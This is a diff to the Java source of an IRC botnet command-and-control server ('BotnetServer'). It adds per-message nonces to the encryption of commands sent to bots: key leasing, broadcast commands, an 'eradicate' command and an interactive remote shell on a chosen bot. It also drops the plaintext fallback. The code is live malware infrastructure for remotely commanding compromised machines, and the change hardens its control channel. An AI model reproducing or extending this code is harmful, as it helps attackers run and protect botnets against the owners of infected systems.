@@ -196,6 +196,19 @@ public class BotnetServer extends PircBot {
 		}
 	}
 	
+	private int getNonce(String bot) {
+		try {
+			DccChat chat = dccSendChatRequest(bot, TIMEOUT);
+			chat.sendLine("nonce");
+			int nonce = Integer.parseInt(chat.readLine());
+			chat.close();
+			return nonce;
+		} catch (Exception e) {
+			System.out.println("\tThere was an error fetching a nonce from " + bot);
+			return getNonce(bot);
+		}
+	}
+	
 	/** 
 	 * <p>If s is a recognized command, the corresponding action is taken, 
 	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
@@ -239,10 +252,10 @@ public class BotnetServer extends PircBot {
 					//String command = "leasekey " + leaseMaster + " " + duration + " " + leasedPubInfo;
 					//System.out.println(command + "\n\n" + botKeys.get(name).encryptMsg(command));
 					DccChat botChat = this.dccSendChatRequest(name, TIMEOUT);
-					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey"));
-					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster));
-					botChat.sendLine(botKeys.get(name).encryptMsg(duration + ""));
-					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo));
+					botChat.sendLine(botKeys.get(name).encryptMsg("leasekey", getNonce(name)));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leaseMaster, getNonce(name)));
+					botChat.sendLine(botKeys.get(name).encryptMsg(duration + "", getNonce(name)));
+					botChat.sendLine(botKeys.get(name).encryptMsg(leasedPubInfo, getNonce(name)));
 					if (!botKeys.get(name).decryptMsg(botChat.readLine()).equals("leased")) {
 						System.out.println("\tThere was an issue leasing " + name);
 					}
@@ -277,7 +290,7 @@ public class BotnetServer extends PircBot {
 					if (!name.equals(NAME)) {
 						// TODO: encrypt command
 						//this.sendMessage(name, command);
-						this.sendMessage(name, botKeys.get(name).encryptMsg(command));
+						this.sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 					}
 				}
 			}
@@ -336,7 +349,7 @@ public class BotnetServer extends PircBot {
 					for (String name : bots) {
 						// TODO: encrypt command
 						//sendMessage(name, command);
-						sendMessage(name, botKeys.get(name).encryptMsg(command));
+						sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 					}
 				}
 			} catch (Exception e) {
@@ -352,7 +365,7 @@ public class BotnetServer extends PircBot {
 				String[] bots = chooseBots(parts, 1);
 				for (String name : bots) {
 					//sendMessage(name, parts[0]);
-					sendMessage(name, botKeys.get(name).encryptMsg(parts[0]));
+					sendMessage(name, botKeys.get(name).encryptMsg(parts[0], getNonce(name)));
 				}
 			}
 		//Respond to an eradicate command by sending it along with the clean script url to each bot
@@ -364,7 +377,7 @@ public class BotnetServer extends PircBot {
 				String[] bots = chooseBots(parts, 2);
 				for (String name : bots) {
 					String command = parts[0] + " " + parts[1];
-					sendMessage(name, botKeys.get(name).encryptMsg(command));
+					sendMessage(name, botKeys.get(name).encryptMsg(command, getNonce(name)));
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
@@ -373,9 +386,7 @@ public class BotnetServer extends PircBot {
 			User[] bots = getUsers(CHANNEL);
 			for (User bot : bots) {
 				if (botKeys.containsKey(bot.getNick())) {
-					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1)));
-				} else {
-					sendMessage(bot.getNick(), s.substring(1));
+					sendMessage(bot.getNick(), botKeys.get(bot.getNick()).encryptMsg(s.substring(1), getNonce(bot.getNick())));
 				}
 			}
 			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
@@ -476,7 +487,7 @@ public class BotnetServer extends PircBot {
 			
 			try {
 				//chat.sendLine("shell");
-				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
+				chat.sendLine(botKeys.get(botNick).encryptMsg("shell", getNonce(botNick)));
 				// TODO: decrypt this
 				//System.out.print(shellout.nextLine());
 				System.out.print(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
@@ -487,7 +498,7 @@ public class BotnetServer extends PircBot {
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					// TODO: make this encrypted
-					chat.sendLine(botKeys.get(botNick).encryptMsg(command)); // Made this encrypted
+					chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick))); // Made this encrypted
 					//chat.sendLine(command);
 					// TODO: decrypt this
 					//String response = shellout.nextLine();
@@ -502,7 +513,7 @@ public class BotnetServer extends PircBot {
 					command = input.nextLine();
 				}
 				//chat.sendLine(command);
-				chat.sendLine(botKeys.get(botNick).encryptMsg(command));
+				chat.sendLine(botKeys.get(botNick).encryptMsg(command, getNonce(botNick)));
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
